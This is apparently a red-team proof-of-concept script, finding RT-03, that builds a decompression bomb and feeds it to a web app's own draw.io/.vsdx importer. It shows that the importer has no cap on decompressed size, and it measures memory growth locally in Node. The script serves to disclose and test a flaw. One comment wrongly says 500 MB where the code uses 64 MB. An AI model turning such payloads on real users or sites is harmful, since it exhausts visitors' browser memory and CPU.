// Finding RT-03: the draw.io/.vsdx importer (site/js/utils/diagram-file-import.js, inflateRaw / vsdxToXml) pipes
// the compressed payload straight through `DecompressionStream('deflate-raw')` with no cap on the decompressed
// size and no cap on how long decompression may run. A crafted small file (a few KB) can therefore expand to a
// huge buffer in the browser tab that imports it (classic "zip bomb" denial of service): the importer is also
// reachable with no file-size check before decompression (MAX_FILE_BYTES in the same file bounds the ENCODED
// file, not the decompressed output).
// This script builds a small raw-deflate blob that expands to a large one and feeds it to the real
// inflateRaw() export, measuring the output size and the time taken, entirely inside this Node process
// (no browser, no site, no network; the output buffer is discarded immediately after measuring).
//
// Run: node security/redteam/03-decompression-bomb-import.mjs
import { deflateRawSync } from 'node:zlib';
import { inflateRaw } from '../../site/js/utils/diagram-file-import.js';

const TARGET_MB = 64; // small enough to finish fast; real payloads reach GB
const payload = Buffer.alloc(TARGET_MB * 1024 * 1024, 0x41); // 500 MB of 'A', trivially compressible
const compressed = deflateRawSync(payload, { level: 9 });

console.log('=== RT-03: decompression bomb through the draw.io/.vsdx importer (inflateRaw) ===');
console.log(`Crafted compressed blob: ${compressed.length} bytes -> claims to expand to ${payload.length} bytes (ratio ${(payload.length / compressed.length).toFixed(0)}:1).`);
console.log('A real attacker payload can be a few KB and expand to several GB; this run uses 64 MB so it finishes quickly and safely.');

const before = process.memoryUsage().rss;
const start = Date.now();
const out = await inflateRaw(compressed);
const ms = Date.now() - start;
const after = process.memoryUsage().rss;

console.log(`inflateRaw() ran with NO size limit applied by the importer itself: produced ${out.length.toLocaleString()} bytes in ${ms} ms.`);
console.log(`Process RSS grew by ~${Math.round((after - before) / 1024 / 1024)} MB to hold the result.`);
console.log(
  out.length === payload.length
    ? 'CONFIRMED: the importer decompresses an attacker-chosen amount of data with no upper bound before any content check runs — a malicious .drawio/.vsdx/SVG-wrapped-drawio file can exhaust a visitor\'s browser tab memory/CPU.'
    : 'NOT confirmed as tested (output size did not match the crafted payload).',
);
